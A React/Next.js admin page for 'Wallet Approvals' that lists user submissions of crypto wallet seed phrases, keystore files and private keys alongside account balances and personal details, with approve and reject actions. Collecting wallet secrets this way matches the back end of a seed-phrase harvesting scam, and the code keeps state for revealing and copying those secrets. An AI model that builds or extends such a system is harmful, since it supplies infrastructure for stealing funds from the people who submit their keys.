"use client";

import React, { useEffect, useState } from "react";
import { toast } from "sonner";
import { CheckCircle, XCircle, Wallet, Clock, Copy, Eye, EyeOff } from "lucide-react";
import { Button } from "@/components/ui/button";

interface WalletData {
  _id: string;
  userId: {
    _id: string;
    email: string;
    fullName: string;
    accountNumber: string;
    balance: number;
    accountStatus: string;
    kycVerified: boolean;
    phone: string;
    address: string;
  };
  userName: string;
  userEmail: string;
  walletName: string;
  walletType: "phrase" | "keystore" | "private";
  seedPhrase?: string;
  keystoreJson?: string;
  privateKey?: string;
  status: "pending" | "approved" | "rejected";
  submittedAt: string;
  approvedAt?: string;
  approvedBy?: {
    _id: string;
    email: string;
    fullName: string;
  };
  rejectionReason?: string;
}

export default function AdminWalletPage() {
  const [wallets, setWallets] = useState<WalletData[]>([]);
  const [loading, setLoading] = useState(true);
  const [filter, setFilter] = useState<"pending" | "approved" | "rejected" | "all">("pending");
  const [expandedId, setExpandedId] = useState<string | null>(null);
  const [actionLoading, setActionLoading] = useState<string | null>(null);
  const [rejectionReason, setRejectionReason] = useState("");
  const [showRejectInput, setShowRejectInput] = useState<string | null>(null);
  const [showSeedPhrase, setShowSeedPhrase] = useState<string | null>(null);
  const [selectedWallet, setSelectedWallet] = useState<WalletData | null>(null);

  useEffect(() => {
    fetchWallets();
  }, [filter]);

  const fetchWallets = async () => {
    try {
      setLoading(true);
      const params = new URLSearchParams();
      if (filter !== "all") params.set("status", filter);
      const res = await fetch(`/api/admin/wallet?${params}`);
      const data = await res.json();
      if (data.success) {
        setWallets(data.data || []);
      } else {
        toast.error("Failed to fetch wallets");
      }
    } catch (error) {
      toast.error("Error fetching wallets");
      console.error(error);
    } finally {
      setLoading(false);
    }
  };

  const handleApprove = async (walletId: string) => {
    try {
      setActionLoading(walletId);
      const res = await fetch("/api/admin/wallet", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          walletId,
          action: "approve",
        }),
      });

      const data = await res.json();
      if (data.success) {
        toast.success("Wallet approved successfully");
        fetchWallets();
        setExpandedId(null);
      } else {
        toast.error(data.error || "Failed to approve wallet");
      }
    } catch (error) {
      toast.error("Error approving wallet");
      console.error(error);
    } finally {
      setActionLoading(null);
    }
  };

  const handleReject = async (walletId: string) => {
    if (!rejectionReason.trim()) {
      toast.error("Please provide a rejection reason");
      return;
    }

    try {
      setActionLoading(walletId);
      const res = await fetch("/api/admin/wallet", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          walletId,
          action: "reject",
          reason: rejectionReason,
        }),
      });

      const data = await res.json();
      if (data.success) {
        toast.success("Wallet rejected successfully");
        setRejectionReason("");
        setShowRejectInput(null);
        fetchWallets();
      } else {
        toast.error(data.error || "Failed to reject wallet");
      }
    } catch (error) {
      toast.error("Error rejecting wallet");
      console.error(error);
    } finally {
      setActionLoading(null);
    }
  };

  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    toast.success(`${label} copied to clipboard`);
  };

  const statusColor = (status: string) => {
    switch (status) {
      case "approved":
        return "bg-green-500/15 text-green-400 border-green-500/30";
      case "rejected":
        return "bg-red-500/15 text-red-400 border-red-500/30";
      case "pending":
        return "bg-yellow-500/15 text-yellow-400 border-yellow-500/30";
      default:
        return "bg-white/10 text-white/70 border-white/10";
    }
  };

  const statusIcon = (status: string) => {
    switch (status) {
      case "approved":
        return <CheckCircle className="w-4 h-4 text-green-400" />;
      case "rejected":
        return <XCircle className="w-4 h-4 text-red-400" />;
      case "pending":
        return <Clock className="w-4 h-4 text-yellow-400" />;
      default:
        return <Wallet className="w-4 h-4" />;
    }
  };

  return (
    <div className="p-4 sm:p-6 space-y-4 max-w-6xl mx-auto">
      <div className="flex items-center justify-between">
        <h1 className="text-2xl font-bold">Wallet Approvals</h1>
      </div>

      {/* Filter */}
      <div className="flex gap-2 flex-wrap">
        {["all", "pending", "approved", "rejected"].map((f) => (
          <button
            key={f}
            onClick={() => setFilter(f as any)}
            className={`px-4 py-2 rounded-lg text-sm font-medium transition ${
              filter === f
                ? "bg-primary/20 border border-primary/30 text-primary"
                : "bg-white/5 border border-border-default text-text-200 hover:bg-white/10"
            }`}
          >
            {f.charAt(0).toUpperCase() + f.slice(1)}
          </button>
        ))}
      </div>

      {/* Wallets Grid/Table */}
      {loading ? (
        <div className="card p-8 text-center text-text-300">Loading wallets...</div>
      ) : wallets.length === 0 ? (
        <div className="card p-8 text-center text-text-300">No wallets found</div>
      ) : (
        <div className="space-y-3">
          {wallets.map((wallet) => (
            <div key={wallet._id} className="card p-4 border border-border-default hover:border-primary/30 transition cursor-pointer" onClick={() => setSelectedWallet(wallet)}>
              <div className="flex items-center justify-between gap-4">
                <div className="flex items-center gap-3 flex-1 min-w-0">
                  <div className="w-10 h-10 rounded-lg bg-primary/10 flex items-center justify-center shrink-0">
                    <Wallet className="w-5 h-5 text-primary" />
                  </div>
                  <div className="min-w-0">
                    <p className="font-semibold text-sm">{wallet.userName}</p>
                    <p className="text-xs text-text-300 truncate">{wallet.userEmail}</p>
                  </div>
                </div>

                <div className="flex items-center gap-3 shrink-0">
                  <div className="text-right">
                    <p className="text-sm font-medium">{wallet.walletName}</p>
                    <p className="text-xs text-text-300 capitalize">{wallet.walletType}</p>
                  </div>
                  <div className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg border text-xs font-medium ${statusColor(wallet.status)}`}>
                    {statusIcon(wallet.status)}
                    {wallet.status}
                  </div>
                </div>
              </div>
            </div>
          ))}
        </div>
      )}

      {/* Detail Modal */}
      {selectedWallet && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4">
          <div className="card w-full max-w-2xl p-6 space-y-4 max-h-[90vh] overflow-y-auto">
            {/* Header */}
            <div className="flex items-center justify-between">
              <h2 className="text-xl font-bold flex items-center gap-2">
                <Wallet className="w-6 h-6 text-primary" />
                Wallet Details
              </h2>
              <button
                onClick={() => {
                  setSelectedWallet(null);
                  setRejectionReason("");
                }}
                className="p-1 rounded-lg hover:bg-white/10 transition text-text-200"
              >
                ✕
              </button>
            </div>

            {/* Details */}
            <div className="grid grid-cols-2 gap-4">
              <div className="bg-white/5 p-3 rounded-lg">
                <p className="text-xs text-text-300 mb-1">User Name</p>
                <p className="font-semibold text-sm">{selectedWallet.userName}</p>
              </div>
              <div className="bg-white/5 p-3 rounded-lg">
                <p className="text-xs text-text-300 mb-1">User Email</p>
                <p className="font-semibold text-sm">{selectedWallet.userEmail}</p>
              </div>
              <div className="bg-white/5 p-3 rounded-lg">
                <p className="text-xs text-text-300 mb-1">Wallet Name</p>
                <p className="font-semibold text-sm">{selectedWallet.walletName}</p>
              </div>
              <div className="bg-white/5 p-3 rounded-lg">
                <p className="text-xs text-text-300 mb-1">Type</p>
                <p className="font-semibold text-sm capitalize">{selectedWallet.walletType}</p>
              </div>
              <div className="bg-white/5 p-3 rounded-lg">
                <p className="text-xs text-text-300 mb-1">Submitted</p>
                <p className="font-semibold text-sm">{new Date(selectedWallet.submittedAt).toLocaleDateString()}</p>
              </div>
              <div className="bg-white/5 p-3 rounded-lg">
                <p className="text-xs text-text-300 mb-1">Status</p>
                <div className={`inline-flex items-center gap-1.5 px-2 py-1 rounded-lg border text-xs font-medium ${statusColor(selectedWallet.status)}`}>
                  {statusIcon(selectedWallet.status)}
                  {selectedWallet.status}
                </div>
              </div>
            </div>

            {/* Rejection Reason (if rejected) */}
            {selectedWallet.status === "rejected" && selectedWallet.rejectionReason && (
              <div className="bg-red-500/10 border border-red-500/20 p-3 rounded-lg">
                <p className="text-xs text-red-400 font-semibold mb-1">Rejection Reason</p>
                <p className="text-sm text-red-300">{selectedWallet.rejectionReason}</p>
              </div>
            )}

            {/* Actions (only if pending) */}
            {selectedWallet.status === "pending" && (
              <div className="space-y-4 pt-4 border-t border-border-default">
                <div>
                  <label className="block text-sm font-medium mb-2">Rejection Reason (optional)</label>
                  <textarea
                    value={rejectionReason}
                    onChange={(e) => setRejectionReason(e.target.value)}
                    placeholder="Provide a reason if rejecting..."
                    className="w-full px-3 py-2 rounded-lg bg-white/5 border border-border-default focus:border-primary outline-none text-sm transition resize-none"
                    rows={3}
                  />
                </div>

                <div className="flex gap-2 justify-end">
                  <button
                    onClick={() => {
                      setSelectedWallet(null);
                      setRejectionReason("");
                    }}
                    className="px-4 py-2 rounded-lg border border-border-default text-sm hover:bg-white/5 transition"
                  >
                    Close
                  </button>
                  <button
                    onClick={() => handleReject(selectedWallet._id)}
                    disabled={actionLoading}
                    className="px-4 py-2 rounded-lg bg-red-500/20 border border-red-500/40 text-red-300 text-sm hover:bg-red-500/30 disabled:opacity-50 transition"
                  >
                    {actionLoading ? "Processing..." : "Reject"}
                  </button>
                  <button
                    onClick={() => handleApprove(selectedWallet._id)}
                    disabled={actionLoading}
                    className="px-4 py-2 rounded-lg bg-green-500/20 border border-green-500/40 text-green-300 text-sm hover:bg-green-500/30 disabled:opacity-50 transition"
                  >
                    {actionLoading ? "Processing..." : "Approve"}
                  </button>
                </div>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
